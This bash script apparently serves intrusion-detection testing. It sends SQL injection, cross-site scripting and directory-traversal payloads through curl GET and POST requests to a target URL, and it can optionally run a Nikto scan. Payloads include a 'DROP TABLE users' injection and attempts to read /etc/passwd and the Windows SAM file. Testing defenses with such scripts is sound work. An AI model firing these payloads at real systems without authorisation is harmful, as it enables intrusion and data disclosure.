#!/bin/bash
# ===========================================
# Web Application Attack Simulation
# ===========================================
# Simulates common web attacks for IDS testing
# Includes SQLi, XSS, and directory traversal
# ===========================================

TARGET_URL=${1:-"http://192.168.1.1"}
ATTACK_TYPE=${2:-"all"}  # sqli, xss, traversal, all

echo "╔═══════════════════════════════════════════════════════╗"
echo "║   Web Application Attack Simulation                    ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo ""
echo "Target URL: $TARGET_URL"
echo "Attack Type: $ATTACK_TYPE"
echo ""
echo "Starting in 5 seconds... (Ctrl+C to cancel)"
sleep 5

# SQL Injection payloads
sqli_payloads=(
    "' OR '1'='1"
    "' OR '1'='1' --"
    "' OR '1'='1' /*"
    "1' ORDER BY 1--+"
    "1' UNION SELECT NULL--"
    "1' UNION SELECT NULL,NULL--"
    "admin'--"
    "' AND 1=1 --"
    "'; DROP TABLE users--"
    "1; SELECT * FROM users"
)

# XSS payloads
xss_payloads=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "javascript:alert('XSS')"
    "<body onload=alert('XSS')>"
    "'\"><script>alert('XSS')</script>"
    "<iframe src='javascript:alert(1)'>"
    "<input onfocus=alert('XSS') autofocus>"
)

# Directory traversal payloads
traversal_payloads=(
    "../../../etc/passwd"
    "..\\..\\..\\windows\\system32\\config\\sam"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "..%252f..%252f..%252fetc/passwd"
    "/etc/passwd%00"
    "....\\....\\....\\windows\\win.ini"
)

run_attack() {
    local attack_name=$1
    shift
    local payloads=("$@")
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "Running: $attack_name"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    for payload in "${payloads[@]}"; do
        # URL encode the payload
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
        
        # Try GET parameter
        echo "Testing: $payload"
        curl -s -o /dev/null -w "%{http_code}" \
            "${TARGET_URL}?id=${encoded}&user=${encoded}&search=${encoded}" &
        
        # Try POST
        curl -s -o /dev/null -w " " \
            -X POST \
            -d "id=${encoded}&user=${encoded}" \
            "${TARGET_URL}" &
        
        sleep 0.5
    done
    
    wait
    echo ""
    echo "Attack phase complete."
}

case $ATTACK_TYPE in
    sqli)
        run_attack "SQL Injection" "${sqli_payloads[@]}"
        ;;
    xss)
        run_attack "Cross-Site Scripting (XSS)" "${xss_payloads[@]}"
        ;;
    traversal)
        run_attack "Directory Traversal" "${traversal_payloads[@]}"
        ;;
    all)
        run_attack "SQL Injection" "${sqli_payloads[@]}"
        sleep 5
        run_attack "Cross-Site Scripting (XSS)" "${xss_payloads[@]}"
        sleep 5
        run_attack "Directory Traversal" "${traversal_payloads[@]}"
        ;;
    nikto)
        # Use Nikto for comprehensive scan
        if command -v nikto &> /dev/null; then
            echo "Running Nikto web vulnerability scan..."
            nikto -h "$TARGET_URL" -maxtime 120
        else
            echo "Nikto not found. Install with: sudo apt install nikto"
        fi
        ;;
    *)
        echo "Unknown attack type: $ATTACK_TYPE"
        echo "Options: sqli, xss, traversal, nikto, all"
        exit 1
        ;;
esac

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Web attack simulation complete."
echo "Check the defense dashboard for detection alerts."
echo "Expected: SQLi, XSS, and Web Attack category alerts"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
